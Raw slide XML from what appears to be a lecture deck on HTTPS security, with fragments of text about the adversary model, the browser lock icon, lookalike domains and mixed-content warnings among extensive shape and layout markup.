                    <a:pt x="342899" y="122766"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="28574">
              <a:solidFill>
                <a:srgbClr val="FF4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98418742" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3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C95A32E-6CD0-4861-96C8-076C183E223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16952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HTTPS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and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Its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Adversary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Model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5674663" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="8128800" cy="1878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HTTPS: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C00000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>end-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>to-</a:t>
            </a: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end</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-52">
                <a:solidFill>
                  <a:srgbClr val="C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protocol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Web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74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Designed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against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attackers,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including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man-in-the-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middle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(MITM)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attacks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21487" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="695160" y="3186000"/>
            <a:ext cx="104796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1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>browser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026562" name="object 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7200720" y="3073320"/>
            <a:ext cx="165132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HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-46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Calibri"/>
              </a:rPr>
              <a:t>server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1022976" name="object 6"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="380880" y="3637080"/>
            <a:ext cx="7286400" cy="1149120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="277209260" name="object 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5170320" y="3303720"/>
            <a:ext cx="10360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1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Internet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683814" name="object 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="4441680"/>
            <a:ext cx="7783560" cy="198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HTTPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="0" strike="noStrike" spc="-6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Calibri"/>
              </a:rPr>
              <a:t>tunnel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defRPr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2000"/>
              </a:lnSpc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provides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encryption,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authentication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(usually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only),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integrity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checking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198812" name="object 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2573280" y="3165480"/>
            <a:ext cx="72360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1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>proxy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04024124" name="object 10"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1376280" y="3719519"/>
            <a:ext cx="7189560" cy="1807920"/>
            <a:chOff x="1376280" y="3719519"/>
            <a:chExt cx="7189560" cy="1807920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="326" name="object 11"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId4"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7653240" y="3719519"/>
              <a:ext cx="912600" cy="1807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7" name="object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1432080" y="4280040"/>
              <a:ext cx="6276600" cy="139320"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 6276600"/>
                <a:gd name="textAreaRight" fmla="*/ 6276960 w 627660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6276975" h="139700" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="6276973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6276973" y="139700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6276973" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="CBCBCB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object 13"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1432080" y="4280040"/>
              <a:ext cx="6276600" cy="139320"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 6276600"/>
                <a:gd name="textAreaRight" fmla="*/ 6276960 w 627660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6276975" h="139700" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6276972" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6276972" y="139699"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1396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3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29" name="object 1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7631280" y="4267080"/>
              <a:ext cx="124920" cy="155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0" name="object 15"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId6"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1376280" y="4268880"/>
              <a:ext cx="124920" cy="155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35032409" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="3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6DE3165-6399-49E3-A049-3CD6AC786BC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59912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The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Lock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Icon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02370451" name="object 3"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="476280" y="1744560"/>
            <a:ext cx="7981560" cy="617040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1347824391" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="2585519"/>
            <a:ext cx="7936560" cy="3493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Goal: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identify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connection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6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SSL/TLS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between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client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server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to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protect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against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active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network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attacker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2000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="524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Lock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icon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should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only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shown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when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page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against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network</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-75">
                <a:solidFill>
                  <a:srgbClr val="C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C00000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>attacker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Semantics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subtle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widely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understood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users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Problem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interface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design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912978" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4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AD0CFAF-CFE1-42D1-A640-5C98170B269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18853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HTTPS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Security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Guarantees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13078674" name="object 3"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="476280" y="1744560"/>
            <a:ext cx="7981560" cy="617040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1268587872" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="2700000"/>
            <a:ext cx="766476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556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origin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page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it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says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the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address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="0" strike="noStrike" spc="-12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bar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820"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="660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must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interpret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what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-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remember amazonaccounts.com?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74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Contents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page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have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been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viewed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or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modified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attacker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851600" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4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38B8C300-34F0-4357-8D32-020EBF2D1AA1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42989" name="object 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7253280" y="1143000"/>
            <a:ext cx="1204920" cy="369720"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="textAreaLeft" fmla="*/ 0 w 1204920"/>
              <a:gd name="textAreaRight" fmla="*/ 1205280 w 120492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1205229" h="370205" fill="norm" stroke="1" extrusionOk="0">
                <a:moveTo>
                  <a:pt x="1204911" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1204911" y="369887"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120491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29869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Evolution</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-41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41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the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Lock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Firefox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39094120" name="object 4"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="944280" y="2647440"/>
            <a:ext cx="6694920" cy="3120120"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1578388445" name="object 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7332120" y="1176120"/>
            <a:ext cx="10389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[Schultze]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686477" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4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86A48AC2-9281-48DF-BDE7-330467BD8F1A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2148310" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="980280" y="1937880"/>
            <a:ext cx="2890800" cy="74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How</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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about</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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Firefox</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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4?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00002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Combining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HTTPS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and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HTTP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3905828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3976200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="88920" rIns="0" bIns="0" anchor="t">
            <a:no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Page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served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over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but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contains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HTTP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7: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lock,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mixed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content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”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-7">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic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warning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Firefox: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!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”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="3366FF"/>
                </a:solidFill>
                <a:latin typeface="MS PGothic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over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lock,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warning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default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754920" lvl="1" indent="-285120">
              <a:lnSpc>
                <a:spcPct val="100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Safari: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does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detect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mixed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content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3780747" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="4915800"/>
            <a:ext cx="6762240" cy="175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79200" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="754920" indent="-285120">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="624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Flash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does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trigger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warning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IE7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FF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2000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="55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attacker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now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inject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scripts,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hijack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session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8850837" name="object 5"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1981080" y="3583080"/>
            <a:ext cx="3885840" cy="1374480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="394988375" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7162920" y="3586320"/>
            <a:ext cx="1449360" cy="351000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFADD6"/>
          </a:solidFill>
          <a:ln w="952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91440">
              <a:lnSpc>
                <a:spcPts val="2761"/>
              </a:lnSpc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Lock</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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icon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56361537" name="object 7"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4419720" y="3711960"/>
            <a:ext cx="4495320" cy="1236240"/>
            <a:chOff x="4419720" y="3711960"/>
            <a:chExt cx="4495320" cy="1236240"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="352" name="object 8"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4447800" y="3778200"/>
              <a:ext cx="2714760" cy="1440"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2714760"/>
                <a:gd name="textAreaRight" fmla="*/ 2715120 w 27147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15259" h="1904" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="2714843" y="1571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3" name="object 9"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId4"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4419720" y="3711960"/>
              <a:ext cx="129960" cy="132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4" name="object 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6445080" y="4191120"/>
              <a:ext cx="2469960" cy="757080"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2469960"/>
                <a:gd name="textAreaRight" fmla="*/ 2470320 w 2469960"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 757080"/>
                <a:gd name="textAreaBottom" fmla="*/ 757440 h 757080"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="2470150" h="757554" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="2470148" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="757237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2470148" y="757237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2470148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" name="object 11"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6445080" y="4191120"/>
              <a:ext cx="2469960" cy="757080"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2469960"/>
                <a:gd name="textAreaRight" fmla="*/ 2470320 w 2469960"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 757080"/>
                <a:gd name="textAreaBottom" fmla="*/ 757440 h 757080"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="2470150" h="757554" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2470149" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2470149" y="757237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="7572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7635147" name="object 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6450120" y="4163040"/>
            <a:ext cx="2460240" cy="1109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31000" indent="-38088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Flash</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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file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served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over</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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HTTP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4533239" name="object 13"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="3124080" y="4447080"/>
            <a:ext cx="3321360" cy="132120"/>
            <a:chOff x="3124080" y="4447080"/>
            <a:chExt cx="3321360" cy="132120"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="358" name="object 14"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3152519" y="4513320"/>
              <a:ext cx="3292920" cy="360"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 3292920"/>
                <a:gd name="textAreaRight" fmla="*/ 3293280 w 32929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293110" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="3292693" y="0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9" name="object 15"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId5"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3124080" y="4447080"/>
              <a:ext cx="129960" cy="1321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14944878" name="object 16"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId6"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7620120" y="2371680"/>
            <a:ext cx="990360" cy="752040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="943337126" name="object 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7736400" y="5097600"/>
            <a:ext cx="91476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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>Can </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-11">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>script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972840" name="object 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7399800" y="5337000"/>
            <a:ext cx="158760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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>embedding</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-86">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="0" strike="noStrike" spc="-21">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>page!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9740467" name="object 19"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="7553520" y="4876920"/>
            <a:ext cx="132120" cy="456840"/>
            <a:chOff x="7553520" y="4876920"/>
            <a:chExt cx="132120" cy="456840"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="364" name="object 20"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7620120" y="4905000"/>
              <a:ext cx="360" cy="4287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428760"/>
                <a:gd name="textAreaBottom" fmla="*/ 429120 h 428760"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path h="429260" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="428844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65" name="object 21"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId7"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="7553520" y="4876920"/>
              <a:ext cx="132120" cy="129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63931" name="PlaceHolder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4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44B7DCF-36A0-46C6-A24B-902712C8B1E8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95551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Mixed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="-41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Content: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UI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Challenges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83519523" name="object 3"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="990720" y="1905120"/>
            <a:ext cx="3276360" cy="1571400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="857667858" name="object 4"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="914400" y="4038480"/>
            <a:ext cx="7238520" cy="2133360"/>
            <a:chOff x="914400" y="4038480"/>
            <a:chExt cx="7238520" cy="2133360"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="370" name="object 5"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId4"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="914400" y="4038480"/>
              <a:ext cx="7238520" cy="2133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1" name="object 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="5551560" y="4495680"/>
              <a:ext cx="533160" cy="45684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533400" h="457200" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="228600"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="5418" y="182529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20958" y="139618"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45548" y="100787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78114" y="66955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117585" y="39041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="162888" y="17964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="212950" y="4644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="266699" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="320449" y="4644"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="370511" y="17964"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="415814" y="39041"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="455285" y="66955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="487851" y="100787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="512441" y="139618"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="527981" y="182529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="533399" y="228600"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="527981" y="274670"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="512441" y="317581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="487851" y="356412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="455285" y="390244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="415814" y="418158"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="370511" y="439235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="320449" y="452555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="266699" y="457199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="212950" y="452555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="162888" y="439235"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="117585" y="418158"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="78114" y="390244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="45548" y="356412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20958" y="317581"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5418" y="274670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76199">
              <a:solidFill>
                <a:srgbClr val="D848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object 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2514600" y="4513320"/>
              <a:ext cx="678960" cy="456840"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 678960"/>
                <a:gd name="textAreaRight" fmla="*/ 679320 w 67896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679450" h="457200" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="228599"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="17319" y="156344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37919" y="123545"/>
                  </a:lnTo>
